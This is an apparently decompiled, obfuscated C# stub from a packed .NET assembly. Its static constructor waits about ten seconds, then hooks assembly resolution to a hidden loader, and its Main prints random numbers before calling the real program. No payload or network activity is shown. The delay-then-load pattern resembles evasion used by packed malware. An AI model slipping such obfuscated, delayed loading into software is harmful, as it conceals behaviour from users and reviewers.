using System;
using System.Threading;
using arma;

namespace ns0;

internal sealed class Class9
{
	internal static ManualResetEvent manualResetEvent_0;

	public static AppDomain appDomain_0;

	static Class9()
	{
		manualResetEvent_0 = new ManualResetEvent(initialState: false);
		byte[] array = new byte[4] { 0, 0, 40, 131 };
		if (BitConverter.IsLittleEndian)
		{
			Array.Reverse((Array)array);
		}
		int millisecondsTimeout = BitConverter.ToInt32(array, 0);
		manualResetEvent_0.WaitOne(millisecondsTimeout);
		appDomain_0 = AppDomain.CurrentDomain;
		AppDomain.CurrentDomain.AssemblyResolve += Class4.smethod_0;
	}

	[STAThread]
	public static void Main()
	{
		Random random = new Random();
		int[] array = new int[10];
		int num = 0;
		int num2 = 0;
		while (num2 < 10)
		{
			int num3 = (array[num2] = random.Next(10));
			num2++;
			num += num3;
		}
		Program.Main();
		Console.WriteLine(string.Join(",", array));
		Console.WriteLine(" {0}", num);
	}

	static ManualResetEvent vTjcTDcnNmIEzbWVzGLBHzYXUVvxA(bool bool_0)
	{
		return new ManualResetEvent(bool_0);
	}

	static void WwApdgiebCBoBgOTsBThtxcXkeUwA(Array array_0)
	{
		Array.Reverse(array_0);
	}

	static int lQWMBvWixVrPAyqQXLnLMFBoVfcj(byte[] byte_0, int int_0)
	{
		return BitConverter.ToInt32(byte_0, int_0);
	}

	static bool OkVnfDgLYyPFqlqRjLBmqGbUIaah(WaitHandle waitHandle_0, int int_0)
	{
		return waitHandle_0.WaitOne(int_0);
	}

	static AppDomain sJaWYBnfbMICbeZjeHREHEXqFnudA()
	{
		return AppDomain.CurrentDomain;
	}

	static void iqPPKPILqorkEsBphvaQKbSxbdXDA(AppDomain appDomain_1, ResolveEventHandler resolveEventHandler_0)
	{
		appDomain_1.AssemblyResolve += resolveEventHandler_0;
	}

	static Random sUJzBbiottircmMASoliMawKhKog()
	{
		return new Random();
	}

	static int kaXLELpxIsCfjUQUnpKreOLfIUcu(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static void pZYFRizJnWuhUQWYPMIPkTuyrLRX()
	{
		Program.Main();
	}

	static Type qOpfXFITbWMHoDxDgdUAEejwBFei(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static void vGOCbasvlKgGMesLYzFaydPxPEVJ(string string_0)
	{
		Console.WriteLine(string_0);
	}

	static void WIaWOkGFnzHtZaeXLeDsHvPMssCT(string string_0, object object_0)
	{
		Console.WriteLine(string_0, object_0);
	}
}
